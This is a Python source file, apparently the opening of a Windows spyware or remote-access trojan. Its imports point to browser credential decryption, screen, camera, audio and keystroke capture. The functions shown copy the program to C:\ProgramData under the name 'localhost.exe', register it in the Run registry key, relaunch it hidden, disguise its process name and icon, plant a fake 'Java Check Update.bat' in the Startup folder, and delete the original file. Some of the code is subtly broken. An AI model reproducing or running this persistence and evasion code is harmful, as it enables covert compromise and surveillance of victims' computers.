import os 
import asyncio
import subprocess
import sys
import config
import pyautogui
import webbrowser as wb
import platform
import psutil
import socket
import json
import winreg
import shutil
import sqlite3
import base64
import win32crypt
import ctypes
import cv2
from aiofiles import open as aio_open
import time
import mss
import numpy as np
import pyaudio
import keyboard
import mouse
import wave

async def self_delete():
    """KILL YOURSELF"""
    script_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]

    if os.name == "nt":
        delete_cmd = f'ping 127.0.0.1 -n 3 > nul & del /f /q "{script_path}"'
        subprocess.Popen(["cmd.exe", "/c", delete_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        delete_cmd = f"sh -c 'sleep 3 && rm -f \"{script_path}\"'"
        subprocess.Popen(delete_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    sys.exit()

def copy_and_run():
    """COPY TO ANOTHER DIRECTORY AND RESTART FROM THERE WITH NEW NAME"""
    exe_name = "localhost.exe"  
    new_dir = r"C:\ProgramData"
    new_path = os.path.join(new_dir, exe_name)

    if not os.path.exists(new_path):
        try:
            shutil.copy(sys.executable, new_path)
        except Exception:
            return False

    """ADD TO AUTOLOAD"""
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "localhost", 0, winreg.REG_SZ, new_path)
    except Exception:
        return False

    """RESTART WITH NEW NAME"""
    if sys.executable != new_path:
        try:
            subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
            await asyncio.sleep(1)
            sys.exit()
        except Exception:
            return False

    """RENAME PROCESS"""
    await rename_process("localhost")

    return True

async def rename_process(new_name):
    """RENAME PROCESS IN TASK MANAGER"""
    try:
        proc = psutil.Process(os.getpid())
        proc.name(new_name)

        """Изменить иконку процесса на стандартную Windows"""
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            hicon = ctypes.windll.user32.LoadIconW(0, 32512)  # IDI_APPLICATION (стандартная иконка Windows)
            ctypes.windll.user32.SendMessageW(hwnd, 0x80, 0, hicon)  # WM_SETICON (маленькая иконка)
    except Exception:
        pass

async def add_to_autostart():
    """SECOND FUNCTION TO ADD TO AUTOLOAD, USE IF NECESSARY"""
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    bat_file = os.path.join(startup_folder, "Java Check Update.bat")

    with open(bat_file, "w") as f:
        f.write(f'@echo off\npythonw "{script_path}"\nexit')
